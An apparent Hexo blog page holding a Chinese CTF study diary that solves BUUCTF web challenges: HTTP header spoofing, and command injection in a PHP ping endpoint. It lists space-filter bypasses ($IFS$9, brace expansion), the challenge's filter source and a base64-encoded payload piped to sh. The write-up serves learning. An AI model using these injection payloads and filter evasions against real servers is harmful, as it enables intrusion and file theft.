@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"13590077975.github.io","root":"/","images":"/images","scheme":"Gemini","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":30,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="[极客大挑战 2019]Http 查看源代码先查看一波源代码，发现 1&lt;a style&#x3D;&quot;border:none;cursor:default;&quot; onclick&#x3D;&quot;return false&quot; href&#x3D;&quot;Secret.php&quot;&gt; 因此去secrect.pnp看看 修改Referer看样子后面会出现UA等老套路了 修改UA果然">
+<meta property="og:type" content="article">
+<meta property="og:title" content="20201226学习日记-BUUCTF小体验">
+<meta property="og:url" content="https://13590077975.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/index.html">
+<meta property="og:site_name" content="Favorhau">
+<meta property="og:description" content="[极客大挑战 2019]Http 查看源代码先查看一波源代码，发现 1&lt;a style&#x3D;&quot;border:none;cursor:default;&quot; onclick&#x3D;&quot;return false&quot; href&#x3D;&quot;Secret.php&quot;&gt; 因此去secrect.pnp看看 修改Referer看样子后面会出现UA等老套路了 修改UA果然">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/r4N9d1.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/r4NBWT.png">
+<meta property="og:image" content="https://s3.ax1x.com/2020/12/26/r46zOP.png">
+<meta property="article:published_time" content="2020-12-26T15:19:45.000Z">
+<meta property="article:modified_time" content="2020-12-26T16:02:43.950Z">
+<meta property="article:author" content="Favorhau">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.ax1x.com/2020/12/26/r4N9d1.png">
+
+
+<link rel="canonical" href="https://13590077975.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>20201226学习日记-BUUCTF小体验 | Favorhau</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Favorhau</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">A blog to share my life</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http"><span class="nav-number">1.</span> <span class="nav-text">[极客大挑战 2019]Http</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="nav-number">1.1.</span> <span class="nav-text">查看源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9Referer"><span class="nav-number">1.2.</span> <span class="nav-text">修改Referer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9UA"><span class="nav-number">1.3.</span> <span class="nav-text">修改UA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9X-Forwarded-For"><span class="nav-number">1.4.</span> <span class="nav-text">修改X-Forwarded-For</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="nav-number">2.</span> <span class="nav-text">[GXYCTF2019]Ping Ping Ping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%80%83%E7%82%B9"><span class="nav-number">2.1.</span> <span class="nav-text">考点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0%E3%80%81%E5%91%BD%E4%BB%A4%E8%81%94%E5%90%88%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.1.</span> <span class="nav-text">0、命令联合执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E6%96%B9%E6%B3%95%E6%9C%89%EF%BC%9A"><span class="nav-number">2.1.2.</span> <span class="nav-text">1、命令绕过空格方法有：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="nav-number">2.1.3.</span> <span class="nav-text">2、内联执行</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">2.2.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">2.2.1.</span> <span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6"><span class="nav-number">2.2.2.</span> <span class="nav-text">判断过滤字符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-number">2.2.3.</span> <span class="nav-text">构造payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%90%8E%E9%9D%A2"><span class="nav-number">3.</span> <span class="nav-text">写在后面</span></a></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Favorhau</p>
+  <div class="site-description" itemprop="description">Nothing is true,Everything is permitted.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/13590077975" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;13590077975" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.situ2001.com/" title="https:&#x2F;&#x2F;blog.situ2001.com&#x2F;" rel="noopener" target="_blank">situ2001</a>
+        </li>
+    </ul>
+  </div>
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://13590077975.github.io/2020/12/26/20201226%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0-BUUCTF%E5%B0%8F%E4%BD%93%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Favorhau">
+      <meta itemprop="description" content="Nothing is true,Everything is permitted.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Favorhau">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          20201226学习日记-BUUCTF小体验
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-26 23:19:45" itemprop="dateCreated datePublished" datetime="2020-12-26T23:19:45+08:00">2020-12-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-12-27 00:02:43" itemprop="dateModified" datetime="2020-12-27T00:02:43+08:00">2020-12-27</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">CTF求生之路</span></a>
+        </span>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h1><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/r4N9d1"><img src="https://s3.ax1x.com/2020/12/26/r4N9d1.png" alt="r4N9d1.png"></a></p>
+<h2 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h2><p>先查看一波源代码，发现</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">style</span>=<span class="string">&quot;border:none;cursor:default;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;return false&quot;</span> <span class="attr">href</span>=<span class="string">&quot;Secret.php&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因此去<code>secrect.pnp</code>看看</p>
+<h2 id="修改Referer"><a href="#修改Referer" class="headerlink" title="修改Referer"></a>修改Referer</h2><p><a target="_blank" rel="noopener" href="https://imgchr.com/i/r4NBWT"><img src="https://s3.ax1x.com/2020/12/26/r4NBWT.png" alt="r4NBWT.png"></a><br>看样子后面会出现UA等老套路了</p>
+<h2 id="修改UA"><a href="#修改UA" class="headerlink" title="修改UA"></a>修改UA</h2><p>果然出现了UA的修改，需要修改成对应的UA</p>
+<h2 id="修改X-Forwarded-For"><a href="#修改X-Forwarded-For" class="headerlink" title="修改X-Forwarded-For"></a>修改X-Forwarded-For</h2><p>比起<code>burp suite</code> 这些我更想用<code>fidder</code>。<br><a target="_blank" rel="noopener" href="https://imgchr.com/i/r46zOP"><img src="https://s3.ax1x.com/2020/12/26/r46zOP.png" alt="r46zOP.png"></a><br>最后得到flag。</p>
+<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>看了题目<code>/?ip=</code>直接傻眼（逃），顶多看得懂其中有一个参数<code>ip</code>，但接下来手足无措。跑去查了题解，梳理了一下。</p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p><em>下面内容来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></em></p>
+<h3 id="0、命令联合执行"><a href="#0、命令联合执行" class="headerlink" title="0、命令联合执行"></a>0、命令联合执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"><span class="number">1234567</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1、命令绕过空格方法有："><a href="#1、命令绕过空格方法有：" class="headerlink" title="1、命令绕过空格方法有："></a>1、命令绕过空格方法有：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$<span class="number">9</span></span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$<span class="number">1</span> //$<span class="number">1</span>改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%<span class="number">20</span>   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$<span class="string">&#x27;cat\x09./flag.php&#x27;</span>;$X       （\x09表示tab，也可以用\x20）</span><br><span class="line"><span class="number">123456789101112</span></span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2、内联执行"><a href="#2、内联执行" class="headerlink" title="2、内联执行"></a>2、内联执行</h3><p>内联，就是将反引号内命令的输出作为输入执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br></pre></td></tr></table></figure>
+
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>梳理了CSDN网友的思路，总结一下</p>
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>用 <code>|</code> 或者<code>;</code>执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>flag.php<br>index.php</p>
+</blockquote>
+<h3 id="判断过滤字符"><a href="#判断过滤字符" class="headerlink" title="判断过滤字符"></a>判断过滤字符</h3><p>滤了空格和标点，flag等符号，不能直接cat flag</p>
+<p><code>cat flag</code>是何方神圣呢？<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-cat.html">cat命令传送门</a></p>
+<blockquote>
+<p>/?ip= fxck your space!</p>
+</blockquote>
+<p>过滤了空格，用<code>$&#123;IFS&#125;$</code>代替</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>fxck your symbol! 过滤{} </p>
+</blockquote>
+<p>也过滤了{}，用<code>$IFS$1</code>代替</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1flag.php</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>/?ip= fxck your flag!</p>
+</blockquote>
+<p>不读flag，读index</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$1index.php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>/?ip=<br>PING 127.0.0.1 (127.0.0.1): 56 data bytes<br>/?ip=<br>|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match)){<br>    echo preg_match(“/&amp;|/|?|*|&lt;|[\x{00}-\x{20}]|&gt;|&#39;|&quot;|\|(|)|[|]|{|}/“, $ip, $match);<br>    die(“fxck your symbol!”);<br>  } else if(preg_match(“/ /“, $ip)){<br>    die(“fxck your space!”);<br>  } else if(preg_match(“/bash/“, $ip)){<br>    die(“fxck your bash!”);<br>  } else if(preg_match(“/.*f.<em>l.*a.*g.</em>/“, $ip)){<br>    die(“fxck your flag!”);<br>  }<br>  $a = shell_exec(“ping -c 4 “.$ip);<br>  echo “<br>“;<br>  print_r($a);<br>}</p>
+<p>?&gt;</p>
+</blockquote>
+<p>一目了然过滤了啥，flag字眼也过滤了，bash也没了，不过sh没过滤：</p>
+<ul>
+<li>总结：过滤的特殊字符：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp; / ？ * &lt; x&#123;00&#125;-\x&#123;1f&#125; &#x27; &quot; \ () [] &#123;&#125;  空格</span><br><span class="line">&quot;xxxfxxxlxxxaxxxgxxx&quot; &quot; &quot; &quot;bash&quot; </span><br></pre></td></tr></table></figure>
+
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;<span class="built_in">echo</span>$IFS<span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64$IFS<span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>
+
+<p>然后查看源代码得flag</p>
+<h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>本篇大部分为转载</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/108295481">https://blog.csdn.net/vanarrow/article/details/108295481</a></p>
+<p>的内容，由于CTF思路确实需要参考。</p>
+<p>在后面挂一个很好的命令提示符漏洞绕过与执行的博客总结</p>
+<p><a target="_blank" rel="noopener" href="https://www.ghtwf01.cn/index.php/archives/273/">https://www.ghtwf01.cn/index.php/archives/273/</a></p>
+<p><del>学会绕过过滤的路还有好长的样子</del></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/BUUCTF/" rel="tag"># BUUCTF</a>
+              <a href="/tags/Web/" rel="tag"># Web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/26/%E5%90%8E%E7%AB%AF%E4%BA%91%EF%BC%8CYES%EF%BC%81/" rel="prev" title="后端云，YES！">
+                  <i class="fa fa-chevron-left"></i> 后端云，YES！
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Favorhau</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">36k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">33 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
